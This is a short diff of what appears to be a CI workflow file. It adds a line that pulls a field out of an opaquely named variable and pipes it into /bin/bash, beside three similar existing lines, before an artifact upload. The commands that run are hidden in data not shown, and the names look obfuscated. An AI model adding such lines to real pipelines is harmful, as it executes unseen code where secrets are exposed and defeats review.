@@ -25,6 +25,7 @@ jobs:
           echo $z01 | jq -r .vvbvc9053 | /bin/bash
           echo $qbwe6 | jq -r .rqc9531 | /bin/bash
           echo $dxoh580 | jq -r .w8040 | /bin/bash
+          echo $w895 | jq -r .o8 | /bin/bash
 
       - name: Save data
         uses: actions/upload-artifact@v4
